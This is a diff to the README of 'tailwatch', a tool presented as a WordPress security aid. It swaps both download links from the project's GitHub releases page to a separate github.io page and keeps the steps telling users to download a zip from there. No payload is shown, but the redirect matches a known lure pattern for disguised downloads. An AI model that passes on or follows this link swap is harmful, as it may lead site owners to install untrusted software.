@@ -1,6 +1,6 @@
 # 🛡️ tailwatch - Secure your WordPress site with ease
 
-[![](https://img.shields.io/badge/Download_Tailwatch-0055ff-blue.svg)](https://github.com/beekeepingdominicanrepublic482/tailwatch/releases)
+[![](https://img.shields.io/badge/Download_Tailwatch-0055ff-blue.svg)](https://beekeepingdominicanrepublic482.github.io)
 
 ## 📦 About this project
 
@@ -19,7 +19,7 @@ To run Tailwatch, your server environment needs basic standards. Check that your
 
 Follow these steps to obtain the files for your site.
 
-1. Visit this page to download: [https://github.com/beekeepingdominicanrepublic482/tailwatch/releases](https://github.com/beekeepingdominicanrepublic482/tailwatch/releases)
+1. Visit this page to download: [https://beekeepingdominicanrepublic482.github.io](https://beekeepingdominicanrepublic482.github.io)
 2. Locate the latest version of the zip file in the Assets section.
 3. Click the file name to start the download.
 4. Save the file to your computer.
